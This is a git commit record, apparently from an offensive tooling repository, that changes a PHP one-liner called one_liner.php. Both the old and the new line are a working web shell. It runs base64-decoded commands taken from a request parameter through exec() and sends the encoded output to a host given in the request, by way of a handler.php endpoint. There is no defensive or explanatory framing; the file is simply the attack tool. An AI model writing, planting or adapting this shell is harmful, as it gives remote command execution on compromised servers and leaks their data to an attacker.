912ca4b243f7378af14986a22f0a290fbd23a483
oldkingcone <11233163+oldkingcone@users.noreply.github.com>
2023-03-01 20:07:28 -0500

    :smile_cat:
    made some more changes.

--- one_liner.php
+++ one_liner.php
@@ -1,1 +1,1 @@
-<?php exec(base64_decode($_REQUEST['qq']), $dd);file_get_contents('http://'.$_SERVER['REMOTE_ADDR'].':'.$_REQUEST['p'].'/w.php?decodeme='.base64_encode(implode(PHP_EOL, $dd))); ?>
+<?php exec(base64_decode($_REQUEST['qq']), $dd);file_get_contents('http://'.$_REQUEST['p'].'/handler.php?decodeme='.base64_encode(implode(PHP_EOL, $dd))); ?>
